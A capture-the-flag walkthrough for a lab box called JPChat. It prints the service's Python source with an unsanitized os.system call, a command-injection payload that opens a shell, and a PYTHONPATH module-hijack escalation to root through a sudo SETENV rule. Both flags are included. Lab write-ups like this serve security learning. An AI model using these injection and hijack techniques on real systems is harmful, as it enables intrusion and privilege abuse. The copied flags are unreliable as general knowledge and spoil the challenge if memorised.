@@ -1,0 +1,117 @@
+JpgChat | 10.10.187.176 | THM
+
+Nmap Scan
+---------
+22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+3000/tcp  open     ppp?
+
+* connect to the port 3000 with netcat
+nc 10.10.187.176 3000
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+[REPORT]
+this report will be read by Mozzie-jpg
+your name:
+lord
+your report:
+lord 
+
+* we get a username Mozzie-jg
+* searching for the source code of the application in gogle with the username we found
+* we immediatly got a hit and found the python code 
+
+		#!/usr/bin/env python3
+
+		import os
+
+		print ('Welcome to JPChat')
+		print ('the source code of this service can be found at our admin\'s github')
+
+		def report_form():
+
+			print ('this report will be read by Mozzie-jpg')
+			your_name = input('your name:\n')
+			report_text = input('your report:\n')
+			os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
+			os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
+
+		def chatting_service():
+
+			print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
+			print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
+			message = input('')
+
+			if message == '[REPORT]':
+				report_form()
+			if message == '[MESSAGE]':
+				print ('There are currently 0 other users logged in')
+				while True:
+					message2 = input('[MESSAGE]: ')
+					if message2 == '[REPORT]':
+						report_form()
+
+		chatting_service()
+
+* we can see that the imput provided here are not sanitized and we can take advantage of this vulnerability to gain a shell on the machine 
+
+nc 10.10.187.176 3000                                                                                        1 ⨯
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+[REPORT]
+this report will be read by Mozzie-jpg
+your name:
+bal
+your report:
+bla';/bin/bash;echo '
+bla
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+wes@ubuntu-xenial:/$ cd /home/wes
+cd /home/wes
+wes@ubuntu-xenial:~$ ls
+ls
+user.txt
+wes@ubuntu-xenial:~$ cat user.txt
+cat user.txt
+JPC{487030410a543503cbb59ece16178318}
+
+------------------------------------------------
+user.txt : JPC{487030410a543503cbb59ece16178318}
+------------------------------------------------
+
+priv-esc
+--------
+* checking the sudo -l we get
+	(root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
+
+* the script is not writable so we need to find an alternate way
+* the script is importing a python module called compare 
+
+	$ cat /opt/development/test_module.py
+	#!/usr/bin/env python3
+
+	from compare import *
+
+	print(compare.Str('hello', 'hello', 'hello'))
+
+* we can possibly perform a library hijack attack on the module
+* we can create a duplicate module named compare with a malicious code and add the module to PYTHONPATH
+
+	$ cat > compare.py << EOF
+	> import os
+	> os.system('/bin/bash')
+	> EOF
+	$ chmod +x compare.py
+	$ export PYTHONPATH=/home/wes
+	$ sudo /usr/bin/python3 /opt/development/test_module.py
+	root@ubuntu-xenial:~# id
+	uid=0(root) gid=0(root) groups=0(root)
+-
+* and we are root 
+
+------------------------------------------------
+root.txt : JPC{665b7f2e59cf44763e5a7f070b081b0a}
+------------------------------------------------
